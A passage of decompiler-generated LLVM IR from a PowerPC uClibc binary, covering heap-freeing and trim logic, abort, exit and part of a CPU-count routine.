  %v0_1000c04c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c04c = or i32 %v0_1000c04c, 3
  store i32 %v1_1000c04c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c04c, i32* @global_var_10023a2c.481, align 4
  %v1_1000c054 = load i32, i32* @r8, align 4
  %v2_1000c054 = add i32 %v1_1000c054, 8
  %v3_1000c054 = inttoptr i32 %v2_1000c054 to i32*
  store i32 %v4_1000c048, i32* %v3_1000c054, align 4
  %v0_1000c058 = load i32, i32* @r8, align 4
  %v2_1000c058 = load i32, i32* @r11, align 4
  %v3_1000c058 = add i32 %v2_1000c058, %v1_1000c040
  %v4_1000c058 = inttoptr i32 %v3_1000c058 to i32*
  store i32 %v0_1000c058, i32* %v4_1000c058, align 4
  br label %dec_label_pc_1000c1cc

dec_label_pc_1000c060:                            ; preds = %dec_label_pc_1000bff8
  %v1_1000c060 = and i32 %v3_1000c024, 2
  store i32 %v1_1000c060, i32* %r10.global-to-local, align 4
  %v3_1000c060 = icmp eq i32 %v1_1000c060, 0
  br i1 %v3_1000c060, label %dec_label_pc_1000c068, label %dec_label_pc_1000c1a4

dec_label_pc_1000c068:                            ; preds = %dec_label_pc_1000c060
  %v1_1000c068 = or i32 %v3_1000c028, 1
  store i32 %v1_1000c068, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c068, i32* @global_var_10023a2c.481, align 4
  %v0_1000c070 = load i32, i32* @r8, align 4
  %v2_1000c070 = add i32 %v0_1000c070, %v1_1000c030
  store i32 %v2_1000c070, i32* %r7.global-to-local, align 4
  %v1_1000c074 = add i32 %v0_1000c070, 4
  %v2_1000c074 = inttoptr i32 %v1_1000c074 to i32*
  %v3_1000c074 = load i32, i32* %v2_1000c074, align 4
  store i32 %v3_1000c074, i32* %r0.global-to-local, align 4
  %v1_1000c078 = add i32 %v2_1000c070, 4
  %v2_1000c078 = inttoptr i32 %v1_1000c078 to i32*
  %v3_1000c078 = load i32, i32* %v2_1000c078, align 4
  %v1_1000c07c = urem i32 %v3_1000c074, 2
  store i32 %v1_1000c07c, i32* %r9.global-to-local, align 4
  %v3_1000c07c = icmp eq i32 %v1_1000c07c, 0
  store i1 %v3_1000c07c, i1* @cr0_eq, align 1
  br i1 %v3_1000c07c, label %dec_label_pc_1000c084, label %dec_label_pc_1000c0b8

dec_label_pc_1000c084:                            ; preds = %dec_label_pc_1000c068
  %v0_1000c084 = load i32, i32* @r31, align 4
  %v1_1000c084 = add i32 %v0_1000c084, -8
  %v2_1000c084 = inttoptr i32 %v1_1000c084 to i32*
  %v3_1000c084 = load i32, i32* %v2_1000c084, align 4
  store i32 %v3_1000c084, i32* %r3.global-to-local, align 4
  %v2_1000c088 = sub i32 %v0_1000c070, %v3_1000c084
  store i32 %v2_1000c088, i32* %r9.global-to-local, align 4
  %v1_1000c08c = add i32 %v2_1000c088, 8
  %v2_1000c08c = inttoptr i32 %v1_1000c08c to i32*
  %v3_1000c08c = load i32, i32* %v2_1000c08c, align 4
  store i32 %v3_1000c08c, i32* %r10.global-to-local, align 4
  %v1_1000c090 = add i32 %v2_1000c088, 12
  %v2_1000c090 = inttoptr i32 %v1_1000c090 to i32*
  %v3_1000c090 = load i32, i32* %v2_1000c090, align 4
  store i32 %v3_1000c090, i32* @r11, align 4
  %v1_1000c094 = add i32 %v3_1000c08c, 12
  %v2_1000c094 = inttoptr i32 %v1_1000c094 to i32*
  %v3_1000c094 = load i32, i32* %v2_1000c094, align 4
  store i32 %v3_1000c094, i32* %r6.global-to-local, align 4
  %v4_1000c098 = icmp eq i32 %v3_1000c094, %v2_1000c088
  br i1 %v4_1000c098, label %dec_label_pc_1000c0a0, label %dec_label_pc_1000c104

dec_label_pc_1000c0a0:                            ; preds = %dec_label_pc_1000c084
  %v1_1000c0a0 = add i32 %v3_1000c090, 8
  %v2_1000c0a0 = inttoptr i32 %v1_1000c0a0 to i32*
  %v3_1000c0a0 = load i32, i32* %v2_1000c0a0, align 4
  store i32 %v3_1000c0a0, i32* %r0.global-to-local, align 4
  %v4_1000c0a4 = icmp eq i32 %v3_1000c0a0, %v2_1000c088
  br i1 %v4_1000c0a4, label %dec_label_pc_1000c0ac, label %dec_label_pc_1000c104

dec_label_pc_1000c0ac:                            ; preds = %dec_label_pc_1000c0a0
  store i32 %v3_1000c08c, i32* %v2_1000c0a0, align 4
  %v0_1000c0b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c0b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000c0b0 = add i32 %v1_1000c0b0, %v0_1000c0b0
  store i32 %v2_1000c0b0, i32* %r4.global-to-local, align 4
  %v0_1000c0b4 = load i32, i32* @r11, align 4
  %v1_1000c0b4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c0b4 = add i32 %v1_1000c0b4, 12
  %v3_1000c0b4 = inttoptr i32 %v2_1000c0b4 to i32*
  store i32 %v0_1000c0b4, i32* %v3_1000c0b4, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000c0b8:                            ; preds = %dec_label_pc_1000c068, %dec_label_pc_1000c0ac
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_1000c0bc = call i32 @__asm_rlwinm(i32 %v3_1000c078, i32 0, i32 0, i32 29)
  store i32 %v1_1000c0bc, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r9.global-to-local, align 4
  %v3_1000c0c4 = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000c0c4, i32* %r0.global-to-local, align 4
  %v0_1000c0c8 = load i32, i32* %r7.global-to-local, align 4
  %v4_1000c0c8 = icmp eq i32 %v0_1000c0c8, %v3_1000c0c4
  br i1 %v4_1000c0c8, label %dec_label_pc_1000c140, label %dec_label_pc_1000c0d0

dec_label_pc_1000c0d0:                            ; preds = %dec_label_pc_1000c0b8
  %v2_1000c0d0 = add i32 %v0_1000c0c8, %v1_1000c0bc
  store i32 %v2_1000c0d0, i32* %r9.global-to-local, align 4
  %v1_1000c0d4 = add i32 %v2_1000c0d0, 4
  %v2_1000c0d4 = inttoptr i32 %v1_1000c0d4 to i32*
  %v3_1000c0d4 = load i32, i32* %v2_1000c0d4, align 4
  store i32 %v3_1000c0d4, i32* %r0.global-to-local, align 4
  %v2_1000c0d8 = add i32 %v0_1000c0c8, 4
  %v3_1000c0d8 = inttoptr i32 %v2_1000c0d8 to i32*
  store i32 %v1_1000c0bc, i32* %v3_1000c0d8, align 4
  %v0_1000c0dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c0dc = urem i32 %v0_1000c0dc, 2
  store i32 %v1_1000c0dc, i32* %r9.global-to-local, align 4
  %v3_1000c0dc = icmp eq i32 %v1_1000c0dc, 0
  store i1 %v3_1000c0dc, i1* @cr0_eq, align 1
  br i1 %v3_1000c0dc, label %dec_label_pc_1000c0e4, label %dec_label_pc_1000c114

dec_label_pc_1000c0e4:                            ; preds = %dec_label_pc_1000c0d0
  %v0_1000c0e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c0e4 = add i32 %v0_1000c0e4, 8
  %v2_1000c0e4 = inttoptr i32 %v1_1000c0e4 to i32*
  %v3_1000c0e4 = load i32, i32* %v2_1000c0e4, align 4
  store i32 %v3_1000c0e4, i32* @r11, align 4
  %v1_1000c0e8 = add i32 %v0_1000c0e4, 12
  %v2_1000c0e8 = inttoptr i32 %v1_1000c0e8 to i32*
  %v3_1000c0e8 = load i32, i32* %v2_1000c0e8, align 4
  store i32 %v3_1000c0e8, i32* %r9.global-to-local, align 4
  %v1_1000c0ec = add i32 %v3_1000c0e4, 12
  %v2_1000c0ec = inttoptr i32 %v1_1000c0ec to i32*
  %v3_1000c0ec = load i32, i32* %v2_1000c0ec, align 4
  store i32 %v3_1000c0ec, i32* %r0.global-to-local, align 4
  %v4_1000c0f0 = icmp eq i32 %v3_1000c0ec, %v0_1000c0e4
  br i1 %v4_1000c0f0, label %dec_label_pc_1000c0f8, label %dec_label_pc_1000c104

dec_label_pc_1000c0f8:                            ; preds = %dec_label_pc_1000c0e4
  %v1_1000c0f8 = add i32 %v3_1000c0e8, 8
  %v2_1000c0f8 = inttoptr i32 %v1_1000c0f8 to i32*
  %v3_1000c0f8 = load i32, i32* %v2_1000c0f8, align 4
  store i32 %v3_1000c0f8, i32* %r0.global-to-local, align 4
  %v4_1000c0fc = icmp eq i32 %v3_1000c0f8, %v0_1000c0e4
  br i1 %v4_1000c0fc, label %dec_label_pc_1000c108, label %dec_label_pc_1000c104

dec_label_pc_1000c104:                            ; preds = %dec_label_pc_1000c0e4, %dec_label_pc_1000c0a0, %dec_label_pc_1000c084, %dec_label_pc_1000c0f8
  %v0_1000c104 = call i32 @abort()
  store i32 %v0_1000c104, i32* %r3.global-to-local, align 4
  %v0_1000c108.pre = load i32, i32* @r11, align 4
  %v1_1000c108.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c108

dec_label_pc_1000c108:                            ; preds = %dec_label_pc_1000c0f8, %dec_label_pc_1000c104
  %v1_1000c108 = phi i32 [ %v3_1000c0e8, %dec_label_pc_1000c0f8 ], [ %v1_1000c108.pre, %dec_label_pc_1000c104 ]
  %v0_1000c108 = phi i32 [ %v3_1000c0e4, %dec_label_pc_1000c0f8 ], [ %v0_1000c108.pre, %dec_label_pc_1000c104 ]
  %v2_1000c108 = add i32 %v1_1000c108, 8
  %v3_1000c108 = inttoptr i32 %v2_1000c108 to i32*
  store i32 %v0_1000c108, i32* %v3_1000c108, align 4
  %v0_1000c10c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c10c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c10c = add i32 %v1_1000c10c, %v0_1000c10c
  store i32 %v2_1000c10c, i32* %r4.global-to-local, align 4
  %v0_1000c110 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c110 = load i32, i32* @r11, align 4
  %v2_1000c110 = add i32 %v1_1000c110, 12
  %v3_1000c110 = inttoptr i32 %v2_1000c110 to i32*
  store i32 %v0_1000c110, i32* %v3_1000c110, align 4
  br label %dec_label_pc_1000c114

dec_label_pc_1000c114:                            ; preds = %dec_label_pc_1000c0d0, %dec_label_pc_1000c108
  %v0_1000c118 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c118 = or i32 %v0_1000c118, 1
  store i32 %v1_1000c118, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32* %r9.global-to-local, align 4
  %v1_1000c120 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c120 = add i32 %v1_1000c120, 4
  %v3_1000c120 = inttoptr i32 %v2_1000c120 to i32*
  store i32 %v1_1000c118, i32* %v3_1000c120, align 4
  %v3_1000c124 = load i32, i32* @global_var_10023a68.510, align 4
  store i32 %v3_1000c124, i32* @r11, align 4
  %v0_1000c128 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c128 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c128 = add i32 %v1_1000c128, 12
  %v3_1000c128 = inttoptr i32 %v2_1000c128 to i32*
  store i32 %v0_1000c128, i32* %v3_1000c128, align 4
  %v0_1000c12c = load i32, i32* @r11, align 4
  %v1_1000c12c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c12c = add i32 %v1_1000c12c, 8
  %v3_1000c12c = inttoptr i32 %v2_1000c12c to i32*
  store i32 %v0_1000c12c, i32* %v3_1000c12c, align 4
  %v0_1000c130 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c130 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000c130 = add i32 %v1_1000c130, %v0_1000c130
  %v4_1000c130 = inttoptr i32 %v3_1000c130 to i32*
  store i32 %v0_1000c130, i32* %v4_1000c130, align 4
  %v0_1000c134 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c134 = load i32, i32* @r11, align 4
  %v2_1000c134 = add i32 %v1_1000c134, 12
  %v3_1000c134 = inttoptr i32 %v2_1000c134 to i32*
  store i32 %v0_1000c134, i32* %v3_1000c134, align 4
  %v0_1000c138 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1000c138, i32* @global_var_10023a68.510, align 4
  br label %dec_label_pc_1000c150

dec_label_pc_1000c140:                            ; preds = %dec_label_pc_1000c0b8
  %v0_1000c140 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000c140 = add i32 %v0_1000c140, %v1_1000c0bc
  store i32 %v2_1000c140, i32* %r4.global-to-local, align 4
  %v0_1000c144 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1000c144, i32* @global_var_10023a58.487, align 4
  %v1_1000c148 = or i32 %v2_1000c140, 1
  store i32 %v1_1000c148, i32* %r0.global-to-local, align 4
  %v2_1000c14c = add i32 %v0_1000c144, 4
  %v3_1000c14c = inttoptr i32 %v2_1000c14c to i32*
  store i32 %v1_1000c148, i32* %v3_1000c14c, align 4
  br label %dec_label_pc_1000c150

dec_label_pc_1000c150:                            ; preds = %dec_label_pc_1000c114, %dec_label_pc_1000c140
  store i32 131071, i32* %r0.global-to-local, align 4
  %v0_1000c158 = load i32, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v0_1000c158, 131072
  br i1 %tmp6, label %dec_label_pc_1000c1cc, label %dec_label_pc_1000c160

dec_label_pc_1000c160:                            ; preds = %dec_label_pc_1000c150
  %v3_1000c164 = load i32, i32* @global_var_10023a2c.481, align 4
  store i32 %v3_1000c164, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r29, align 4
  %v1_1000c16c = and i32 %v3_1000c164, 2
  store i32 %v1_1000c16c, i32* %r9.global-to-local, align 4
  %v3_1000c16c = icmp eq i32 %v1_1000c16c, 0
  store i1 %v3_1000c16c, i1* @cr0_eq, align 1
  br i1 %v3_1000c16c, label %dec_label_pc_1000c17c, label %dec_label_pc_1000c174

dec_label_pc_1000c174:                            ; preds = %dec_label_pc_1000c160
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r3, align 4
  store i32 268484988, i32* @lr, align 4
  %v0_1000c178 = call i32 @__malloc_consolidate()
  store i32 %v0_1000c178, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c160, %dec_label_pc_1000c174
  %v3_1000c17c = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000c17c, i32* %r9.global-to-local, align 4
  %v3_1000c180 = load i32, i32* @global_var_10023d70.503, align 4
  store i32 %v3_1000c180, i32* @r11, align 4
  %v1_1000c184 = add i32 %v3_1000c17c, 4
  %v2_1000c184 = inttoptr i32 %v1_1000c184 to i32*
  %v3_1000c184 = load i32, i32* %v2_1000c184, align 4
  store i32 %v3_1000c184, i32* %r0.global-to-local, align 4
  %v1_1000c188 = call i32 @__asm_rlwinm(i32 %v3_1000c184, i32 0, i32 0, i32 29)
  store i32 %v1_1000c188, i32* %r0.global-to-local, align 4
  %v1_1000c18c = load i32, i32* @r11, align 4
  %v2_1000c18c = icmp ult i32 %v1_1000c188, %v1_1000c18c
  br i1 %v2_1000c18c, label %dec_label_pc_1000c1cc, label %dec_label_pc_1000c194

dec_label_pc_1000c194:                            ; preds = %dec_label_pc_1000c17c
  %v3_1000c194 = load i32, i32* @global_var_10023d74.501, align 4
  store i32 %v3_1000c194, i32* %r3.global-to-local, align 4
  %v0_1000c198 = load i32, i32* @r29, align 4
  store i32 %v0_1000c198, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c1a0.511 to i32), i32* @lr, align 4
  %v2_1000c19c = call i32 @__malloc_trim(i32 %v3_1000c194, i32 %v0_1000c198)
  store i32 %v2_1000c19c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c1cc

dec_label_pc_1000c1a4:                            ; preds = %dec_label_pc_1000c060
  %v0_1000c1a4 = load i32, i32* @r31, align 4
  %v1_1000c1a4 = add i32 %v0_1000c1a4, -8
  %v2_1000c1a4 = inttoptr i32 %v1_1000c1a4 to i32*
  %v3_1000c1a4 = load i32, i32* %v2_1000c1a4, align 4
  %v3_1000c1a8 = load i32, i32* @global_var_10023d7c.494, align 4
  %v3_1000c1ac = load i32, i32* @global_var_10023d90.496, align 4
  %v2_1000c1b0 = add i32 %v3_1000c1a4, %v1_1000c030
  store i32 %v2_1000c1b0, i32* %r4.global-to-local, align 4
  %v1_1000c1b4 = add i32 %v3_1000c1a8, -1
  store i32 %v1_1000c1b4, i32* %r9.global-to-local, align 4
  %v1_1000c1b8 = load i32, i32* @r8, align 4
  %v2_1000c1b8 = sub i32 %v1_1000c1b8, %v3_1000c1a4
  store i32 %v2_1000c1b8, i32* %r3.global-to-local, align 4
  %v2_1000c1bc = sub i32 %v3_1000c1ac, %v2_1000c1b0
  store i32 %v2_1000c1bc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c1b4, i32* @global_var_10023d7c.494, align 4
  store i32 %v2_1000c1bc, i32* @global_var_10023d90.496, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c1cc.512 to i32), i32* @lr, align 4
  %v3_1000c1c8 = call i32 @munmap(i32 %v2_1000c1b8, i32 %v2_1000c1b0, i32 %v1_1000c1b4)
  store i32 %v3_1000c1c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c1cc

dec_label_pc_1000c1cc:                            ; preds = %dec_label_pc_1000c17c, %dec_label_pc_1000c150, %dec_label_pc_1000c194, %dec_label_pc_1000c040, %dec_label_pc_1000c1a4
  store i32 %v2_1000c00c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 268485080, i32* @lr, align 4
  %v3_1000c1d4 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 %v3_1000c1d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %entry, %dec_label_pc_1000c1cc
  %.0 = phi i32 [ undef, %entry ], [ %v3_1000c1d4, %dec_label_pc_1000c1cc ]
  store i32 %v0_1000bfe4, i32* @r0, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v1_1000c1b4, { 1, 0, 2 }
  uselistorder i32 %v3_1000c1a4, { 1, 0 }
  uselistorder i32 %v0_1000c130, { 1, 0 }
  uselistorder i32 %v1_1000c0dc, { 1, 0 }
  uselistorder i32 %v0_1000c0c8, { 1, 0, 2 }
  uselistorder i32 %v1_1000c0bc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000c07c, { 1, 0 }
  uselistorder i32 %v0_1000c070, { 1, 2, 0 }
  uselistorder i32 %v3_1000c028, { 1, 0, 2 }
  uselistorder i32 %v0_1000bfec, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 11, 10, 5, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 6, 3, 10, 7, 8, 4, 9, 5, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 8, 1, 9, 2, 10, 11, 3, 4, 12, 6, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_10023a60.483 to i32), { 6, 2, 7, 0, 1, 8, 9, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_10023a28.467 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -8, { 7, 8, 9, 3, 4, 5, 6, 10, 11, 0, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10021074.479 to i32), { 3, 8, 1, 0, 4, 9, 2, 5, 6, 7, 10 }
  uselistorder label %dec_label_pc_1000c1d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1cc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000c17c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c150, { 1, 0 }
  uselistorder label %dec_label_pc_1000c114, { 1, 0 }
  uselistorder label %dec_label_pc_1000c108, { 1, 0 }
  uselistorder label %dec_label_pc_1000c104, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c0b8, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000c1f0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r3, align 4
  store i32 268485136, i32* @lr, align 4
  %v0_1000c20c = call i32 @__malloc_consolidate()
  %v0_1000c218 = load i32, i32* @r29, align 4
  store i32 %v0_1000c1f0, i32* @lr, align 4
  %v2_1000c228 = call i32 @__malloc_trim(i32 %arg1, i32 %v0_1000c218)
  ret i32 %v2_1000c228

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), { 2, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 3, 19, 4, 20, 21, 22 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v1_1000c244 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_1002108c.513 to i32))
  store i32 32, i32* %stack_var_-56, align 4
  %v4_1000c264 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-56, i32 0)
  %v3_1000c26c = load i32, i32* @global_var_100212cc.515, align 4
  %v3_1000c270 = icmp eq i32 %v3_1000c26c, 0
  br i1 %v3_1000c270, label %dec_label_pc_1000c278, label %dec_label_pc_1000c2a0

dec_label_pc_1000c278:                            ; preds = %entry
  store i32 1, i32* @global_var_100212cc.515, align 4
  br label %dec_label_pc_1000c280

dec_label_pc_1000c280:                            ; preds = %dec_label_pc_1000c2b0, %dec_label_pc_1000c278
  %v1_1000c28c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_1002108c.513 to i32))
  %v1_1000c294 = call i32 @__GI_raise(i32 6)
  %v1_1000c29c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_1002108c.513 to i32))
  %v3_1000c2a4.pre = load i32, i32* @global_var_100212cc.515, align 4
  br label %dec_label_pc_1000c2a0

dec_label_pc_1000c2a0:                            ; preds = %entry, %dec_label_pc_1000c280
  %v0_1000c2ec = phi i32 [ %v3_1000c26c, %entry ], [ %v3_1000c2a4.pre, %dec_label_pc_1000c280 ]
  %v3_1000c2a8 = icmp eq i32 %v0_1000c2ec, 1
  br i1 %v3_1000c2a8, label %dec_label_pc_1000c2b0, label %dec_label_pc_1000c2ec

dec_label_pc_1000c2b0:                            ; preds = %dec_label_pc_1000c2a0
  %v2_1000c2b0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 2, i32* @global_var_100212cc.515, align 4
  store i32 ptrtoint (i32* @global_var_1000c2cc.517 to i32), i32* @lr, align 4
  %v3_1000c2c8 = call i32 @__GI_memset(i32 %v2_1000c2b0, i32 0, i32 20)
  store i32 268485352, i32* @lr, align 4
  %v3_1000c2e4 = call i32 @__libc_sigaction(i32 6, i32 %v2_1000c2b0, i32 0)
  br label %dec_label_pc_1000c280

dec_label_pc_1000c2ec:                            ; preds = %dec_label_pc_1000c2a0
  %v3_1000c2ec = icmp eq i32 %v0_1000c2ec, 2
  br i1 %v3_1000c2ec, label %dec_label_pc_1000c2f4, label %dec_label_pc_1000c300

dec_label_pc_1000c2f4:                            ; preds = %dec_label_pc_1000c2ec
  store i32 3, i32* @global_var_100212cc.515, align 4
  br label %dec_label_pc_1000c300

dec_label_pc_1000c300:                            ; preds = %dec_label_pc_1000c2ec, %dec_label_pc_1000c2f4
  %v3_1000c300 = phi i32 [ %v0_1000c2ec, %dec_label_pc_1000c2ec ], [ 3, %dec_label_pc_1000c2f4 ]
  %v1_1000c308 = icmp ne i32 %v3_1000c300, 3
  call void @__pseudo_cond_branch(i1 %v1_1000c308, i32 268485404)
  store i32 4, i32* @global_var_100212cc.515, align 4
  %v1_1000c318 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000c318

; uselistorder directives
  uselistorder i32 %v2_1000c2b0, { 1, 0 }
  uselistorder i32 127, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 6, { 11, 12, 69, 70, 13, 14, 1, 15, 16, 17, 18, 19, 2, 39, 40, 41, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 42, 33, 43, 44, 45, 3, 46, 47, 48, 4, 49, 50, 51, 52, 5, 6, 53, 54, 34, 7, 55, 56, 35, 8, 57, 36, 58, 59, 60, 61, 37, 9, 62, 63, 64, 65, 66, 38, 10, 67, 68 }
  uselistorder i32* @global_var_100212cc.515, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_1000c300, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2a0, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v5_1000c354 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 ptrtoint (i32* @global_var_100210a4.518 to i32))
  %v1_1000c35c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_100210a4.518 to i32))
  %v3_1000c364 = load i32, i32* @global_var_10021220.519, align 4
  %v3_1000c36c = icmp eq i32 %v3_1000c364, 0
  br i1 %v3_1000c36c, label %dec_label_pc_1000c380, label %dec_label_pc_1000c374

dec_label_pc_1000c374:                            ; preds = %entry
  %v1_1000c37c = call i32 @__libc_errno()
  br label %dec_label_pc_1000c380

dec_label_pc_1000c380:                            ; preds = %entry, %dec_label_pc_1000c374
  store i32 ptrtoint (i32* @global_var_1000c38c.520 to i32), i32* @lr, align 4
  %v3_1000c388 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 %v3_1000c388, i32* @r3, align 4
  store i32 268485520, i32* @lr, align 4
  %v1_1000c38c = call i32 @__GI___uClibc_fini(i32 %v3_1000c388)
  store i32 268485540, i32* @lr, align 4
  %v2_1000c3a0 = call i32 @_stdio_term(i32 %v1_1000c38c, i32 268494484)
  %v0_1000c3a4 = load i32, i32* @r31, align 4
  %v1_1000c3a8 = call i32 @__GI__exit(i32 %v0_1000c3a4)
  ret i32 %v1_1000c3a8

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0 }
  uselistorder label %dec_label_pc_1000c380, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 268485584, i32* @lr, align 4
  %v2_1000c3cc = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_10010bf8.521 to i32))
  %v3_1000c3d0 = icmp eq i32 %v2_1000c3cc, 0
  br i1 %v3_1000c3d0, label %dec_label_pc_1000c454, label %dec_label_pc_1000c3d8

dec_label_pc_1000c3d8:                            ; preds = %entry
  store i32 268500992, i32* @r9, align 4
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100100c4.43 to i32), i32* @r27, align 4
  br label %dec_label_pc_1000c434

dec_label_pc_1000c3f0:                            ; preds = %dec_label_pc_1000c434
  %v3_1000c3f0 = load i32, i32* %stack_var_-40, align 4
  %v1_1000c3f4 = inttoptr i32 %v3_1000c3f0 to i32*
  %v2_1000c3f4 = load i32, i32* %v1_1000c3f4, align 4
  store i32 %v2_1000c3f4, i32* @r9, align 4
  %v1_1000c3f8 = inttoptr i32 %v2_1000c3f4 to i8*
  %v2_1000c3f8 = load i8, i8* %v1_1000c3f8, align 1
  %v3_1000c3fc = icmp eq i8 %v2_1000c3f8, 99
  br i1 %v3_1000c3fc, label %dec_label_pc_1000c404, label %dec_label_pc_1000c434.backedge

dec_label_pc_1000c404:                            ; preds = %dec_label_pc_1000c3f0
  %v1_1000c404 = add i32 %v2_1000c3f4, 1
  %v2_1000c404 = inttoptr i32 %v1_1000c404 to i8*
  %v3_1000c404 = load i8, i8* %v2_1000c404, align 1
  %v3_1000c408 = icmp eq i8 %v3_1000c404, 112
  br i1 %v3_1000c408, label %dec_label_pc_1000c410, label %dec_label_pc_1000c434.backedge

dec_label_pc_1000c410:                            ; preds = %dec_label_pc_1000c404
  %v1_1000c410 = add i32 %v2_1000c3f4, 2
  %v2_1000c410 = inttoptr i32 %v1_1000c410 to i8*
  %v3_1000c410 = load i8, i8* %v2_1000c410, align 1
  %v3_1000c414 = icmp eq i8 %v3_1000c410, 117
  br i1 %v3_1000c414, label %dec_label_pc_1000c41c, label %dec_label_pc_1000c434.backedge

dec_label_pc_1000c41c:                            ; preds = %dec_label_pc_1000c410
  %v1_1000c41c = add i32 %v2_1000c3f4, 3
  %v2_1000c41c = inttoptr i32 %v1_1000c41c to i8*
  %v3_1000c41c = load i8, i8* %v2_1000c41c, align 1
  %v4_1000c41c = zext i8 %v3_1000c41c to i32
  %v0_1000c420 = load i32, i32* @r29, align 4
  %v1_1000c420 = add i32 %v0_1000c420, 4536
